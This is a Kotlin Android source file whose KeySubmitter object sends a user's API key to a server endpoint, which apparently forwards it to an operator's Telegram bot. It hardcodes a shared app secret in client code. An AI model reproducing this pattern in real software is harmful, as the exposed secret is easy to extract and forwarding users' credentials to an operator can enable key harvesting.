package com.aaa.ai.data

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * Forwards a user-supplied API key to the admin Telegram bot via the Worker.
 *
 * The Worker holds the admin bot token and messages the operator. This keeps all
 * bot secrets server-side — the app only POSTs the key to the Worker endpoint.
 */
object KeySubmitter {

    suspend fun submit(context: Context, provider: String, key: String, userTag: String): Boolean =
        withContext(Dispatchers.IO) {
            runCatching {
                val base = context.getString(com.aaa.ai.R.string.bot_server_url).trimEnd('/')
                val url = URL("$base/api/submit-key")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("content-type", "application/json")
                conn.setRequestProperty("x-app-secret", APP_SHARED_SECRET)
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true
                val body = JSONObject().apply {
                    put("provider", provider)
                    put("key", key)
                    put("userTag", userTag)
                }.toString()
                conn.outputStream.use { it.write(body.toByteArray()) }
                val code = conn.responseCode
                conn.disconnect()
                code in 200..299
            }.getOrDefault(false)
        }

    // Must match APP_SHARED_SECRET on the Worker. If it ever changes server-side, update here.
    private const val APP_SHARED_SECRET = "aaa-ai-shared-secret-2024"
}
